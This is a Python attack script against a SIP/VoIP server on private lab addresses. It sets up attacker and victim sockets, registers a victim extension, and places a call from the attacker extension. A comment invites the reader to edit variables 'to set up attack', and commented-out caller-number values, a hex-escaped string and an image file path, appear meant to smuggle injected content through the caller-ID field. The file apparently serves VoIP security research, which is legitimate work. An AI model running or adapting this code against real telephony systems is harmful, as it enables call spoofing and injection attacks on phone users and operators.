import socket
from sip_client import SipClient


def encode(val):
    ret=""
    for c in val:
        ret+="\\x%02x" % ord(c)
    return ret


class Attack:
    def __init__(self):
        # edit these variables to set up attack
        sip_host="192.168.21.58"
        victim_number="1002"
        # attacker_number=encode("514353")
        # attacker_number="resources/images/kill.png"
        attacker_number="1001"
        attacker_port=52058
        victim_port=53086
        self.attacker_socket=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.victim_socket=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.attacker_socket.bind(('192.168.20.33', attacker_port))
        self.victim_socket.bind(('192.168.20.33', victim_port))
        self.attacker_socket.connect((sip_host, 5060))
        self.victim_socket.connect((sip_host, 5060))
        self.attacker_client = SipClient(attacker_number, attacker_port, sip_host, victim_number)
        self.victim_client = SipClient(attacker_number, victim_port, sip_host, victim_number)

    def register_victim(self):
        self.victim_socket.send(bytes(self.victim_client.register(300))) # type: ignore
        self.victim_socket.recv(8192)

    def initiate_call(self):
        # attacker send invite
        self.attacker_socket.send(bytes(self.attacker_client.invite_message())) # type: ignore
        # attacker recive 100 trying
        self.attacker_socket.recv(8192)
        # vitcim recive invite trying
        invite = self.victim_socket.recv(8192)
        # vitcim send 100 trying
        self.victim_socket.send(bytes(self.victim_client.trying_100(invite))) # type: ignore
        # vitcim send 180 ringing
        self.victim_socket.send(bytes(self.victim_client.ringing_180())) # type: ignore
        # attacker recive 180 ringing
        self.attacker_socket.recv(8192)
        
    def close_sockets(self):
        self.victim_client.register(0)
        self.attacker_socket.close()
        self.victim_socket.close()
